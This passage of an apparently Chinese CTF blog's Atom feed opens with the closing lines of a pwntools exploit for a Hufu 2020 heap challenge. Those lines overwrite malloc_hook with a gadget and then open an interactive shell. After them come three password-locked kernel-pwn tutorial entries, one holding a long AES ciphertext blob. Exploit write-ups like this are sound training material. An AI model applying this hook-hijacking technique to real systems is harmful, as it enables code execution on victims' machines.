class="line">enc(<span class="number">2</span>,str(malloc_hook<span class="number">-8</span>),p64(rceq) + p64(reallocq))</span><br><span class="line">new(<span class="number">0x200</span>,sign=<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;虎符2020的线上赛部分Pwn题WP,忘记报名了,只能靠其他师傅要题&lt;/p&gt;
&lt;h2 id=&quot;MarkMan&quot;&gt;&lt;a href=&quot;#MarkMan&quot; class=&quot;headerlink&quot; title=&quot;MarkMan&quot;&gt;&lt;/a&gt;MarkMan&lt;/h2&gt;&lt;p&gt;这个题耗费了太多
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南三</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%89/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记三/</id>
    <published>2020-04-16T08:50:01.000Z</published>
    <updated>2020-04-17T03:22:10.148Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南二</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%BA%8C/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记二/</id>
    <published>2020-04-16T08:49:47.000Z</published>
    <updated>2020-04-17T03:22:13.084Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none">  </div>]]></content>
    
    <summary type="html">
    
      The article has been encrypted, please enter your password to view.&lt;br&gt;
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn快速上手指南一</title>
    <link href="https://nocbtm.github.io/2020/04/16/kernel-pwn-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>https://nocbtm.github.io/2020/04/16/kernel-pwn-学习笔记一/</id>
    <published>2020-04-16T08:49:37.000Z</published>
    <updated>2020-04-17T13:04:12.776Z</updated>
    
    <content type="html"><![CDATA[<script src="/crypto-js.js"></script><script src="/mcommon.js"></script><h3 id="encrypt-message">该文章被加密了，请联系管理员请求密码.</h3><link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap.min.css"> <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.5/css/bootstrap-theme.min.css"> <script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script> <script src="//cdn.bootcss.com/bootstrap/3.3.5/js/bootstrap.min.js"></script> <div id="security"> <div> <div class="input-group"> <input type="text" class="form-control" aria-label="Enter the password." id="pass"/> <div class="input-group-btn"> <button type="button" class="btn btn-default" onclick="decryptAES()">Decrypt</button> </div> </div> </div> </div> <div id="encrypt-blog" style="display:none"> U2FsdGVkX1+6U/TcTf7hKm58Y8pcpNOBJ/yMgzJrUQudNA6Rfk6ROCOAzytMX1x8yFvZTfyhJGgwALzA6A6vMujWLvr/cwz6IEG5smKMfDtXrPrxGQLkZ7j2CxJHuLVRIhHUiqUN5+OYD7/KBtVTvzD23mxwh0Xe316C8aI05YkKhII9Y/cbf7JZ1J9pcjcZXdqZ+Qg1jdrJRM8KBPVw7xRzEjRFGBkcFp264taY3UGcbgekG6Bie0eO+DmJSuWRYWC6OrplbecR3WSRQ0kvZqwNvp2MjrVSPw9U1tWcsXTHHnmlhiPBcvVfJgSKNmATtFnJpaPo++BXlYXJKPhxfBw12edCf3nAcJZMeEbk/YxqjxjLhj06DwuWcupo+k5l/86f0sYLl6iyG+hHKwNMyvPnnknxqwp0YNc248eKE8/0n7mBtpPy0mJJZiZLVV0NC/uBGjyukQy/IGGKVporJIgI6JvfQHxxrnplsV2KOWjH0+WgQ4NtkvhIWxBignpdcBrd6PEwHRf/e4qWA8Mio5dE57Vny35Qs5Dl+/V1cawLA1GOa/APmxdqQ07BOy3mtjTxFmTw2HALI+JFFl9M+JhKG+RjcUPC6F/CVs9OkZtnh8ufWWmFivU3J3JGBNYQoeSD/yPNAO2zmob0JUxi1+vl+m0lbpc71gi7uqQKW6bPaLzF+SvgdYUZOJOXr1M0f3ktyRMOapzpuhp/x48KC9KUqeV8+igZdXAZO4zJy8FelVuwYrXj0QdCBIk9swDTIiNfdtzApED+IBcE9OOPoFrVj8HvRKYUqoBfkX4/GLxmctrpL6m2R/2ZKAtkBhz+reobG6NoZBkZuNJywiilPgRDFDBkfVFFuNyPdDF0yWj203lZUvlMkR0vDCHD8iKP33M1KtXhsjuyawq3EVYxl/Bkp3d9FxeIri1PRgzZlVMyjrvr/T9M8GZu9bYML4beKxzdOqHy2bQalsj8lROy2jPGIiXdZyRwlToSWU5PuGo4NE/BzMyScfJRJItSMbuf2ilFf1EVqN4q5gFI3i9DIzHQbLNX2t/JIOI3IrwLHrYHbNRNUBL/18SN0qZcBabiy2g3JFcwxHOypWvBlfxCTsEYzC9FCq+8S87ffigttqyaWb5l9j8p1oIumeEBoqeAdfSc2NR/IiIRo9vOTCq02VfS8FZLVxYH5CMItjA9/vgU+qVxOHy4rEOdP2emAwNjfOnI43fLUDUc3WUH3lDlZuIFlIE05h2BmmcjIxMuyuAlQEZG7CYHBviGknIU3i9WZ5GAgd8PlQt51zCihjqdVMPjs991AvdyNhU0lqccxNn5/G1+29b8nAZ0gp56xSiyR3HKiDRH6RBH5MWxpTORT8XUQxtV2jlB9mX+tVA9qjCo+j9TQI+iHxZC02aAMjK5vnYmn6WqKXCgHQYbUF9Dx6kMLzcNBmsIv2nBKLBUoqHN2FYicnQhDJN+0ojv8R0ycrd+Me1j1hLHMvRzy8deN2CjzR7zIjdxQeCTrLGDANPOTfRHKiPKsEI84xnK8YUCY1Yj4UDVAZoMAsuULk5ZLi4APRD9A1qHrXXzusY1OGIR2H/LReHgkIy6jxSY3NRIyFfSYw+Z/SYWsvFCs5pfv369MVbuTkKEQkBARvmNVKLgB7OOLKU812oVyT9HKwKhTHAPCw6RUuBcvNtzcg3VTJx/OuM03oIN+3XT6BfsapzA92snsS/dBsleAzdjBGax5Tb2c1/k7cxGhlvfKGSc4+x5NETLrz5d/W255+YdRAkcxuNE4xDaIKGKR/W/Jeim6Ik5u0LY5acnea5658tUYVC92VrNf191JM20RoEMe1f793x+6wM/dwQ67zkGGbSBW+P1wdpPjCJeoY5u6N5EjnWaSLgCEBEfmzoKFu6ZkncEFJUHkk6+BAOd8fpjS71r0znecE1f12WKveQu8rQiOPL3Ixt13I6IL3WCqLwESWp2qUXk4KHXhhxhpy8K8bbnrNUswJvg+u/kM1/Qycpr7NtKf6rWH0mJk6WSu1XyeZFgDESYUobIS+gFh7ZWR03d86HvfoEi4bnGdq/4INXXNsMu4GFB+7ibjAk1h73+lkEtfMLSOUBKkLjtNDegFdR1zFBdMuiN/VHD4k7G685C5VC3bhlOeJPTz+Ehf3LfgbsJWqrgD3TEbsCG6dv9GYk62x5lNmbleHEJUTO7/pzQOWekL7J7uw/R8TAwFmnh8mREZAKoEE0fhzoaX83C2V7Mh+8A7zKH9U/BwbWoCNqv8GKYtEctfemCAj6P57qLW1trG1sC7mZPyToRHScr2QzHzMBVlELrCCkysZclXPtederVQpTj4o8ec+qPLfbEOYL6EVmj92YTgL87izKMIiMyT72Yp3qy7gKak3wSGrqlGEEqnXdk3TMXsU2j+NgkZhtqiA2cbfH14FzIjxx8FVdig/iN0VVIFtkoSleS/SpTJS5bkaClbK8+FfujXNtH2Z+eVjl23MKP4Lr4l8a5Vh2tpofKTxhDh3q77sF8YT4RCXlNv7u1YJyV3J3fxCV0YKgYXAcYH3FFSesun7zCWWc3CrCXG3iwSX+KRUP3v06y3qpq6RJiKIhILyYWvqf0AvE2VTwArWuTkKOuSeoiBFkxHcQbqyZFpIcRutxbjw9WVfTI01jbtqqkck+1K+JkV1twr0YynlTFeLqgP4+JzMAWQTf5WLCNjPV/fLOay3Z/CQegDbB2rno9Lb3D9hAw2PgjuAYgRnpCSvov3YoYtrN3A+VeeUCOLQQfzdIFiPQ6QPl/RxXUbYgCd++rpsuzEtIMOtHweQ2HKdOFqTxs55MIAwRjwgbb7W+LXWaH2uTjbK7t5TiHpqNSnxp8PRRDpA/06DCZx14mYP5o3wauP/mJ6Ar726i7ZB6eVBaKVV3q7ANVyzAeIV6uyWkmmHW61rkf9xIOT00QJ1MqFNeXtKOdQd8zM/+drEMdsIjGKB93L2L+Ersh9qLW9bbKQ+rvct9Sahne+Pgnss1PCXbsAJ1hdsENaeNGVhIn53LcgPjTViJF94yrkxhdw9heTQO6OwKU/Smt4r0A0xhROjCRjwwOLWUS3rBYSQ2YTRk4lDjO+yBn018+tzarsteBy+aOx0Ggmz+aERPMnT9L5bsMWVG+4pOns0kSf5D5dRsGmqU6X0czpprCEvHO0z2Tkn4/cqLD9DhkPUb4lXYQccmEfnUvtdlgUts3g+PTe3cfqhsZNK89LLBzGmR+Nw8oY7t4rmDcWb74cOo5b6+tgH9GyYirZTBVyoj2S83ASmTJGg/wefVInYpS+zRRoC41WzObRvm0JXeHjtKENCl5dF/YizaTOTcqE5blO8pGyfgpiMqpGpvOdM9lnGjTYj/5c+idef//1DvgzM+Lgo4QrgW6spGIo4jyvXQ1veK5OuL5IkdE5Uq4ldvtG+vExb917dEEgq9BPZm0fCN9PjbDo+ms7UI+1VoNKGY3eaxbHM7Z2BrV/E6EDtRTfn3Hf5aRG+JEifWngcTyTVPfw2NSI40DUHEgIUFy/slIJT7Y+OEZ4KrUmXsSJbkXiW0WS9WSx2L2lMchb8DrACqr3c5kGtlFiwzQvjoNT0HfLKDd6dOMJiitPNkVaKvKhKL/PEjNXjYLpGwKCIl/iJ5dXBCWABJCUTucDNRX7sWt7D6otMXyPidXzOffyVsGlgYdZg/5pvcXjbYxaSHVgT4HTo4EHdRmuNRrN/pSbAr6+gp9RcmCAFNs4W73WqlVbazZWrM1/6N0dNPC2cJmH+OSnzwdfDivRfwrS79zVP8vFqQNWjts9XJibEI15n71N2nlq0m7XWdMvkN6LKyU/Vjf5usC87oB76sUIGNkXJG77OZF1FT/PA0LIkdyw+iy2ChhwSZg4VizAhmdKyBmw0C7AwTKFIkW0cgc50KP7iWEdoE3NcKSh1axHQ19T/2tlTytXl0aumJX2+W1e8mAhIMYScH0fptavyrlTp9ZCoXWaP8O7fPlH6c1524VLOnqS4x3qzfArZLXcRlj+IzNL88TVEqB7HmoDBhbfr55jmSaGxcVPVC6D4Nwn8HSKax7mQlgbqzmixFpkxDMbOeQJ3jD0xxa1mIDfg4ZA6S27vSncFGlljQWPjBClABgc67Vc/TtM9sl9m5aq/hegbIcSaAC5iPvmJ+t/cKVzb4TsznBcGU3xqoL4klSUXa90SL0ApRrWTo3hgeMMYU4gyWiymkBKByOJTeL6+9d9N7lszMRkwEa8ZOfeGTBP3GRrcq1oxeqLQ1NhodEhW8wNr+/W7Mgex02lnhWD5S89juV4B6sR4jxSOL1ImJ0zIy5ySyRxloWVLkBbZKFtmAJY9JlaQySfznw7r72BJ90MG0hoQvWIQ0JXir+lB53EgyfQLxdHrlFwIokaJOxBoo29EnUKAjH1c5bd3S/jNhytJvXsq+QXJfy2NDezLB80Lz030QKiXHrxW0LlsTMDBg4MFG/Q/rUs+J71L7Epr41IwIsZHTgCDv8YvOtOPTFEZv74iWE4gcm4gdVanV31hIdVBwC+u1xg7FqDSVMs8CEhUPZbaC3fRahBxOxf9yiatFvbFpiRf22cm88ZjNFna4c1geI1W6HNUBOiAoifvC1wv7JgQmXjqgxEUWtQLkj8bWE0iWDFvAnIl6H+rL53oISdATHI3uyLqGWEROIWBiq7wSP8iKdFIrj9CR6jmKttXNpMPYNiXYLsJEBJ7lnegYXdnJfg+A6lG6+QaXe4c5zfMKyhTIDiMs7xwWCVtHybpMPolY3rinT/P3/E+hzYfEXLjW5v+7fbYB5oMyxDCKfA8yVsdWRXvjvZeTR8QnDgFOseDFIKqh9WmbTKYClU+vIYpCyP4KlMDVrYRKfrDY/M8/FZhWuwhEevr4nZIC7N38oV0EJxxxtf24v7TXI20ntXIF5M9F9PUkpKKbjfbw1ItZ8V4DdwmuRKzOiorHgOeSYlr18MEC8vZTYf8Ng0gN7iT1fwTSg4hEtPaj8LV+MOGkL1bLnpSchJIaGU1CNJSEApHnKfguGDzIseS9BjTm+RYKyN3Zcug7p0DDyozc+td7POHDoh9eofky9zNeqPsI9qXlcu2VEVoIVqPS0EJZ485bu69YJjkslLdZSDZnBXn0VkYltLZF80ZMVBzL3lR/Te5BVj7IVdy5pBIkqRfFZXfylvLBBwzbxcDCjirkTNGeca4FWlW2yGVL0P9TJjVkeDuMiEsff4K1FnHL2nJBc9VMcLtSJR9u+kzHFV6XGo/ZDLOMpebr8dbTlWQlrYdLfKwA3qnowvcreuHyxqjjapAEmUS0+b1Lckiv6io547oiYc7OzeJu2jS6ZDuiMONWcBT+t7dM+mTNdTfTnMpQvUN7kQBobaFcQuEXGRtyybYM5pOwirepymMfoMVQSxndN7/JeG5UPnEYx7rShj4D4XQS/rwGv4cBog0Lez7geps6rWNJ5tdypIlObF9VXIIT9gKCgxtMel/CACfbqUGpSsUXtlx1gQ7sxAReBmyev8CXbH6mM1vg8eiFwaoEAG9ofMIcVAQH/u/FqGrP59iMQn9HxwV8BwdKO5a/rh8etAJtNQ9jv9MnOkWw1oL8SvcOq6Wm8OkS3vYirInNe3k+as0qNB0tgwvuuW1Tz9/eNDzbtIBWBhRkGOwojaXTMWRDPuge7A7cXdUMvDyG8AxVmoo4YxzTsLVFX7nFO8rNbn0OxHmXZRvmkHQyd/Y+jCTlr67WSRsWmHZ9DjpRBBGqMI1dXo1k51siFbSK1e0paYcs5n3puA4bJZ3JjhTKmHh8scjkLROOZsxETd9GyVquydG8BRWp1qsQTK/P2rSt9OoYchAdBsQwyfdoaWAEa/uQUA1Pr1srL9C1o6Ye3KEE5wHbJTp2N23HdSt9IZtE9/KByAQ4NGq1kdyjsg2EfCfkxUf4X8NjPxRwqbn4AW055RBvtdpBufcfe0pKEgZqvxHS16UCbYR+cORdC7Qmma5WUL+byZOxoyOIHF0uizQ2yjNe7C65BbnxVt9MMY0dX584lY+MegmPviPXtPXmnyTAp8RW/GibfIBpCppFKy78kd3GnZmHbflW3FK/NHD3AnRbAWVbSjxmukL6S/3o6kbf+6TF4l+7Ecu7X51fiN76del9NwoDXkSqr+PVwFbnJTSKaIM99ZqJsUu772SCrJ31YPKfzQ3IgtZ08RJgm+y8x5ybBrQElshP9khcrPlHEWNFqa1Yqkq0ylMWQhOi1z5H4sYwqDW7kf1Nx/XXD60zY2WJC3i5xxDQmfpLM7Ek+KWoQK+PLGYgWfdKIl+XflYt9CumdugUIyCECQnLkMcSAIxaBCN5uZYug7E/5VtN1uDjH7oc+VNrf1SM2UioS0GcnXIjA4xlDEXxfaGWip2em+6aEBvAJWMOk9rCFdcsqc4TEMnQxRGyBxsb7opib487YJuBv8Xn7RfuVBiVakzpzkE+PU3oXeH+EVT6SAp117EEcmzbGU7id8oKpu/SSyc3khS1NDJ6Od5mgXMpsan5baAskUcHkTqkm1TnGd2lZh5HJICIplPTgRx9rhczkA2Ox+etZNHGAmzglAIavv9hEC3nI5DjQEyYvgbRs9I68xPFOPH48nF7n8Z+ZsP3M04EArt0Uz6peFVzvNmulkK7TR3veOXWsiu13ia1Q4lCGHQ5bkGxf/39OOL2iyP6JeFcUwqNhSxZ1z0/+jcIC6AAqANeUNfg5EsM3JUP7V/sAP6EIUbqokk6CA4Dt9oeQEKEai8/5UkeY/yFXJAQOEmkUOh85waV70dLKnjJd6ok8g7hpcdtgYTZ0QDRAaGw2ASHLRHE081QP3eTPnnekFluMjdP8vvYaSLDg/AgWteaVJJ8sNGErMkvhZsYt+qyEwaHmmmUvHQC/NE4f2fYiJ4We2TlF86Vk9pqaB50op/NeVtPcriKzXT5r3c9KJT9x4a6Yn3OBH1u6CY+spzZWTl5RltpjeGNV8j66T1lSNjpYWBG67EnHFSd9QCbAxy2aUDWQTXuVqE/f0hQPSIbTvdijWcD9ET8mi2B2eqZg3ZgiSD2q6n7Oc//eAbRpOansSqb/+Is6Qu95f7CtXHIqZ+o3kLP6q5Sm+pNBeBtNsSBzt5u/0/jsEqsHST2a/tcbxBsogW3oZov1WGQ6xE9FJlh+RzT5mathDQ0ttzOOlClvgSWFtlL1FU4lkToSSgkKVKWJcNUB+z/K9pjtqPPvkxgHATC0xBsFWy2IVD/m+/QVTvmtbcNruqE0LkkbB0mWtiVKq7T9JWdGlZINipViSFZQIaYQVHz6k9mj86kKALoAcbarG3DN9cUDBlIFLXcwEmrbrAVQ1DCo2d4iEZ0te7HBHErstp2HeMDkxu5E6plq4a1R23Rmtei5geoEWSJqNh46rxhTZMujLt4JgklYNd+5hx5aTY8XIRDLvZ7ZM/3hUgHiuYAX0vSEGhCAdzL5J015QjlgLsmTU4BJbsrFGFHAmOc30X0EX0B65ylQzBsaJ2tWGhGVAogSgbAcshBbmiBjDAAnadT4Q6gv8qzuew3EE0qwP75v7Ob6In+HtxZNuof9oOkq9kM78i1GfcFRw48829bL7XYxn85pRHvqi8PpOBTceAEHqjqjutEQdhJ+kmUFnPIWMvL8N3lRFQ1G0w7MtRw9O4c/W3X7d5JlrQlkJQ11ctBozTyF33TUVt3vYh+Bz2OPpBQMJdwtze5VEdkot+0VF1Td3vCVT1wgZXVEeN/5b9vZ1CNkLQootXNpdjJ3nIpUgkFRntA3cAmtJcB3Co/BQ7EMgSb/Z9zJX7XTKy2kyF6l70/9CkzMsuyXWI9Y0JN21OL/nmFKXyRp53y5nVCv4eO8h1Tds7uh4E6TNEKzWmH9WbDPGScG7WT8Noo5Q66U0g/fT+twbWfSr8X5/Q4Us73ztv4eDH0QytVaeOUcQXMhV4lXpxNHbpqILkqjWb4lCt96pnBgyrl0HT9tc3ywvUrlZB2tdm/OTh3M/zUuqTYDwHLYlTscR06WS9MDTNlCIteDtJxsHKn4QHtt5lkhqnXRwoY08KQ3eFQmSr4ZHgWKvkpkAnM9Y2d0ZpjhEuT+7iS7b9ZVcKE8bgCeUdxaSCKp0Q8F9+sWcn3E4syLQel8jcnyZD0jfCXjxkp4QJOVnJ91IyVNVao1J/TocoYE5yamO6cmf5nXEjhCbni2JkrJBaCwNicGX/RaIEOVh2/QzHW5vy8/gZFpa2F7lcFMOV7Xk1JL5/u8QeeeTuhacJdeY/ujSHtmO9gNd8kuIP985RbUROLhLpbK5r96vvTqz2ABOuv3OUUlzCzn/9PYOy5if0j1WgcmOt7D7xl+u9jmXvHzXL1gRd3Hpk59ybC2kdQuKmamzR+DsDwJb86ZB54V4AQ59T3ER1jx+PPUZB3RxKLB5geL9pDm6W+ljcG4CQuiE5D//eyFMuBSRZ0ClHctdeDjBpCO1fXaZxCrbI8wtpRFMJ6a5WG6oj4p5y1vBPqm0MMotnuef6sYkohG1OGDmctJvmwSGB1vRhOrswb1ilvEbokt9oB3j06wMAKpiqoFFcwbaOwCJT7AgK/e6zUM56tggbHETEkex+DPP0PnnYkAXtB6zNdGh8pPj2IYN8nKtDqAby4Z0k1mRRfeN5W7rfnVTBlU5dvtryshExdhs6yCDN57wvhUo0QPuRCfqc2blUp5T7vaNdkhvVJQPPp+T7nw0v4BS+204FUawShsN53o+veXmPK9MK2h4Xu8jqCDW6Ht+cKbZKFEU7AYfylQ98f2MdUrRsOmQDi9oXReAarvFVzNU9aGWWwhFkd3fO8Vs88jVg1NPRCvJbxPZgKr+V9/5od7uQK0nw4Ygg1G3Xq/ruc+0djYCxWrJdwpo31shEmvQ3Ze0ck010J+qRvDK9yr+fqDYuXkrwsTrjqmxKmYbM9Z5s/uCprVGmYmyi7ODierCzSKw5mHDsSxlGTQnwVEEZaDZan0CCmhx8oH8DZ/d3/ToeZwkLY8oMw8o+f4g0tQtIc1YZhbvjZzg9hy3AVySNYCrDCYumgXtCqdyDkyYgT+7s6TgkFit8eAozl/j0SuZMFJ8Az+Nmps2x6XgujdaOnRV8NOLRY3pqNiz8JSQaTDVg0pWAXm13eiDn2pt8zJLSmBAVA+MCTYmqI1d0dtYCIhBXng+kbCtqj/Sh9QgEPnUVYGNZGbWn15wyzwYwX9BuL9uPKmWy+bJup3TOxt7apPmoOuaRyev9AEn9hAcA05J6OYIqwqRwzlOFgKK+bD9IjTAv5dYyRIbhjLS97XCEf6egTCwPygoRaGXT+X5mO7iB34RmkI+L0Ta+aM+v7SuCQrjqZLOccL4Njs+DjyPM0j6R2UWduEzQ9murevA+tbL/yARfvlQdM7CH5/vXAiVmz2s0IsLgY0IKlbDtihA+erE1qS/kvSaUz337PhZTegrElUJEt1mvGro7Ce09M8mADNmESRa4FC0Eu8Yt9uHRvj0Q014T9iJTDRYPivnbxYUnH9Z5ksQH/q3+I1esg49GDcq3BiKvqv6S09ZagMXYPKl6p46DL81dp/PLrbSUwrCkymx4Gv3GoTXrjt9K9YGhGCJGWU08AUD7dXrql8ah6VwV+0g+Rm6zSVsfOYmEUS7+0546DiYbuSEc4PiGFDfqDS48R3CfpD661242CEDik106z9hYl5lgr+Hb5SOAeeeOcve/M9iUgPUmJnl7D0Ule3zjuiPrRxHoq52tZXpLNMNmcke7jPthOlEm3vGPxFvdmK0gGYayJU43GHO/sWC/kbD7ZmzkFtyyeUr++rowctxgxIBLno8UkEhLEal6flqs6TyQMBCdcx1tqI9NzSaaoNLFeQBAssHKTRHuWJ1uLUAP2WgwiUdF0UAI/hOrK7AfBWdTB62FRlIT4lTnf18Zp452Z9GrNqK5WqrmouVcAnhez+uHfpod3XKiUhWslAtNgptYkcpfWtxdSZJH9bDNoAN3UmEh3Kl+je8yM+Dejw4Gg33ftpXFNci9wd+b2jSLd/owfXZ+Xw2wDkZ77CJt76wK0YqVuM2q3vOBPVSndwLRE+tJxygRFIWIf7qsUzZpVBSZrqJD3ILGj+j6Ko3+3RNIBJj5VZAY2KSwrhmO1hz7Odd+EDt10imfY/nxnN9RjjfWnwGrAZ9wBcg8e5TnRGHnfbDO8ns1rJZD8aLXVIIwNVFzWXf0HyVKovlccvR90qFRft59QueMGA/rGZl0Y7DkMK/5v+Y3svNO9qJXaoqNf5azLX1p+GDlSuJPop4gihi0X/o+xVqA4oOoYb2h/chHf6/sIFZxVTwhGfWQBWY2wo0mm+WkP8uKPXBIkCLnWU5sJSZ7fg973G8ER+4XfCpPU9AUjSW5FgdS4Md8GAb9xs7tTA0kVsYC811V5QA3eX1J8MRN8SdD4IjfYIn57e0ywntgLGVWuOdikbiPslu9XwD76/r0dR3CXVUX/40Hb/bPVs3k24iKTuplfvgCcuHjRgKlG5VGR8fc2dgdgz2yDseZe63yEFK0v0MuozGG6AMYVGBsOfAs+vy8POtbjSDtLasPYqvz0VyPtITsMBUe6UD+1UAvedKvs0zLaBXjAuxLTIDBDeCTA/+8QpphhbXYQNQSq5BYmYpJWuHyOmz5wvk+2ZJT7xsBy4swm8hATz00sRAMhrd8Bj++1DTy5URmJqRpvzsv7+7AnmMNHkQTPF+pgtXP8SiL/XI7LqOLDRCItEt435avdJ5yEy4uBnWyejL33RQQrTNZhAtkrpDv/Rh0ytMIwKbvYzzGm1TF3jBGH8ZVrvrMIdf0TBn9/Mi4r3LEl4EGYN1QM2xX1cgECC6u5Fugde0LXp8uQHCl1df/8k2hSL8UW1PsvnDA94i0/4HzPUzsz9vbxmmgxoSlxmbwtMCT8AqP4qu10rbta4xrgGUQdWDIu95Aw8k6XyhT7sG/LYsYqqMKml1RnuD7kZwQ+MW2p6/M+Ewdw9skUXWtzFac7U0ILmRETjUJfe68+jILWsTPMxJUSO3ev3tPR0QSTUcVH7fqLqm+8BQQA1jvDVibBO7aCE9wt7cCK0jvot+CSEhEfBiQ2jcfAvgAYNud4cFh9d75ZABZgj7Kn6d9ACfftOhE5hh/tY1bcpuCi1UUKV2o+d2DebkEpYWa2b5G44qDc7IvQVoZ8xEqGOSrHBeLEL6RlvKW8a7RtwCZfuhAmoXTMaiVB2CiMJx2Z5WW3MqUMGTwW94GB9UZO4wmT1Qr9eD/qJn+3gN8Lxq3QWKk2fd0cLdx08yDHxemyUr4Dcb0pfH3lLsS71Wl+K2B1tT7P6g25LdPOjVJ+botXmrcuKau0unAmL28S3+k4WApaXzODWpdljdtGmPEeiF2ZOxd/nUhyw1FKlIlFVqmo6t95CxBeToMYlXCfDscd2+XexqZhRch/W+BmwkXhS1QbG+mcBJ8wxKHbxhOV7jAs0g1gXp39aebIXp1ffNrnf4dFVUVk+O55dikjmIzv4g87XiR2PA0G18TkntpYGm5PpGupcCecwhbFCf0JSy0f0IaBwUykK8R2sU0QOt4gZnacgO82aFGH7hBbHr9/w4BM7S8UayKrtFj/W1Nazejt2KFdbJGzTFUVYY/AVdATFSAUvhhuHY4zsoApPETxij8bCGi/7UsWIZ7Ki+pwtvSIri3Uzt3WRp3Ze+uXyfb/c0WDEJPc80Z81+vItIbgqJV5ouMB44JSGRrWpjA+bMZata936hlsmeQi8OO5V8ighAmNdZJgmznYAEYxX2JEDB/EfLn5gSK/ChW7/mIu4vm/S4VJZ/NTwMSzZvvc2OyuZL6wIbxS292RBaNT3odaeDkm8IUL7/nb7GskCN48gkrwUj+xFwX4eUS3k5sEl+GXMc0bqDDUK7YSCOAOPMU03Sywu9NcOxlUqts5RKzCiCH5KEd8cJGqI42HHWXSky4S3LhBpl/GbfPTC7QaZ70L2dd6cvY9QmtooJizbDLHDo15eyuYWOtSzsGwcgyNzitacuOFv5myi2N9G/wzuG9f4Mgk1mKXXg3Yvj0l7n9g00QRxYYPhSWihm+dYUfnmh9s3NiS6Td2vvDLMpmaLe/otleWpXXr7z4Bk3kw09AMjhfGgdLaUOtdKn7vNEgOfl1FqAZifA3olMWNRMVfoSxbNr2gXbA2xteBJLWOPdcQUK2GAfaBAtYekgUqTCV/XkqqtKN0hGhMKcsJBJN5+FNtl19Ka8eNydZ8vCpEWMi0vo3yYwc7G+ixi02D+z3mhCtCM2KW8gEgtfkbsruqL1hefc3SoWgoAsZkLBrBgoUknvc8k7KtBB+kO8iIHu200Dww/ULTxIObACGTPatbRvFmP0cERb7qI/dXlqXJ6Tkt+0Sbmw/RmdQ2rI5DAXHpSV2ygXJwJXRXBAw3iyMTwR198lCC0XFJxsOvaqacpW0fwVqoeW0mU+7LCURZTY5otTpsEusQKFDlVIwG53vCKODtIFI4v/0fzO/cdR18S5KfnD6iRjBOgXvCuNPJYRxHqIascFyADHfKE2nOWtI/F72ce0JrqVFt6YecqpEBlfGzLIGvu1UZpQiGRWUnGP5e2oWdM3xoerX20NUIAsSk8PKSYR+9muPpydkcPNniLasGCT8kLzctNY8SN3I7vTipQrIiId3MUdA/fAz2S9va1sxuxPIkphtetR1blCEtWEyysBO8AN+qDQVKGFSmQdhziwfqxbE0bKQ0OZAKRGdZXGtmBrPEIW7hV8TXD4HbAxyUDgMZGGDSuN/d0vTfr7AzSPodckEcp3PZQzvVdXmAK8NewU6t84lQo4STc8s7z1DFpn47GkiFH2ipDI0fPnjNhy09cYakR77r+YVifQtSfBSTudsQb478i9QO1kPcmFXUjV1cMm0LrLOYgiHmCkrYMGqRlbWPa9rHmWt42SYUVimcEgto2EDcXG9YmLbCrYZL8Wu5dDzRgknDAaJi5JtuchWyf6gla3HdoYTvzx7pUh9h0lqF3irfzKQJoZvnUMNn/IN9A2mZE++sVhD8N833rFxOklu+Czg+lmc1oo+LNMo1kdbMtSFCzmSGYG0acdXbtZs1L9rHuJV+DsohhyBrY4O1AxyMpDHQ4/1ZYXMyhHN0LP7Zeguen+FrxGhpzXezvlfQDqhIlChCzxrwDXtACFuW/YKsDunVZ6DqJmfdw4WxTJJ1uuw4WjsPr68Tp+uc5+b